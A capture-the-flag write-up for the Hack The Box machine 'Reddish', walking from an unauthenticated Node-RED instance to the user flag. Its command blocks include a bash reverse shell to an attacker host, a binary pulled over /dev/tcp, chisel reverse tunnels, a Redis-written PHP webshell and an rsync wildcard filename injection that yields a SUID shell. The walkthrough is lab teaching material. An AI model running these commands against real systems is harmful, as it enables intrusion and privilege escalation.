## Overview

Reddish is an Insane Linux machine built entirely around **pivoting through nested Docker containers** — there are no credentials anywhere, only misconfigurations. The single open port runs Node-RED with no authentication; its exec node gives a shell in the `nodered` container. From there you tunnel into a private network, turn a default Redis into a file-write webshell on the `www` container, and abuse an rsync wildcard cron to land the user flag. This post stops at the user flag.

## Recon

| Port | Service |
|------|---------|
| 1880 | Node.js (Node-RED) |

A full scan shows just one port. `GET /` returns 404, but `POST /` returns a JSON blob revealing the editor path:

```bash
nmap -Pn -p- --min-rate 2000 10.10.10.94
nmap -Pn -p1880 -sV 10.10.10.94
curl -s -X POST http://10.10.10.94:1880/    # -> {"id":"...","path":"/red/{id}"}
```

## Enumeration

The `POST /` response gives the Node-RED editor path `/red/<id>/`. The admin flow API under that path responds without any authentication — `GET /red/<id>/flows` returns `200`, and `/red/<id>/settings` reveals Node-RED `0.18.4`. An unauthenticated flow API on Node-RED is effectively unauthenticated RCE, because the platform ships an "exec" node that runs OS commands.

## Foothold

We deploy a flow that wires an **inject** node (set to fire once on deploy) to an **exec** node running a reverse shell. The container runs Node-RED as root.

```bash
# flow.json: [tab, inject(once)->exec, exec runs: bash -c "bash -i >& /dev/tcp/<lhost>/9001 0>&1"]
nc -lvnp 9001
curl -s -X POST http://10.10.10.94:1880/red/<id>/flows \
  -H 'Content-Type: application/json' -H 'Node-RED-Deployment-Type: full' --data @flow.json
```

A root shell lands inside the `nodered` container.

![Node-RED RCE](/assets/Images/reddish-001_foothold_nodered-rce.png)

The container sits on two internal Docker networks. Pinging the subnet reveals two neighbours — a `www` container (port 80) and a `redis` container (port 6379). We transfer **chisel** in over `/dev/tcp` (no curl/wget in the container) and build reverse tunnels so those internal services are reachable from our box:

```bash
# attacker serves chisel; container pulls it
nc -l -p 8003 -q1 < chisel
cat < /dev/tcp/<lhost>/8003 > /var/tmp/chisel; chmod 755 /var/tmp/chisel
# attacker
./chisel server -p 8002 --reverse
# inside nodered container
/var/tmp/chisel client <lhost>:8002 R:6379:172.19.0.2:6379 R:8001:172.19.0.3:80 9002:127.0.0.1:9002 &
```

The Redis instance has no password and allows `CONFIG`. The web-root is a shared volume between the `redis` and `www` containers, so we point Redis's database dump at the web-root and write a PHP webshell:

```bash
redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 set x '<?php system($_REQUEST["cmd"]); ?>'
redis-cli -h 127.0.0.1 config set dir /var/www/html/
redis-cli -h 127.0.0.1 config set dbfilename rsh.php
redis-cli -h 127.0.0.1 save
curl 'http://127.0.0.1:8001/rsh.php?cmd=id'    # uid=33(www-data)
```

![Redis webshell RCE](/assets/Images/reddish-002_exploit_redis-webshell-rce.png)

A quick request upgrades the webshell to a reverse shell as `www-data` on the `www` container. Looking at `/etc/cron.d`, a root cron runs `rsync -a *.rdb` inside a directory `www-data` can write to. Shell wildcard expansion lets us inject an rsync option via a filename:

```bash
cd /var/www/html/<writable_subdir>
printf '#!/bin/sh\ncp /bin/bash /var/tmp/bashx\nchmod 4755 /var/tmp/bashx\n' > reddish.rdb
touch -- '-e sh reddish.rdb'
```

When the cron's `*.rdb` glob expands, rsync parses `-e sh` as the remote-shell option and runs `sh reddish.rdb` **as root**, creating a SUID bash.

## User flag

```bash
cd /; /var/tmp/bashx -p -c 'id; cat /home/somaro/user.txt'   # HTB{...}
```

Running the SUID bash with `-p` keeps the root euid and reads `user.txt`. Access as root on the `www` container achieved.

> Foothold complete. Privilege escalation — pivoting onward to the backup container and the real host — is left as an exercise. This post stops at user.
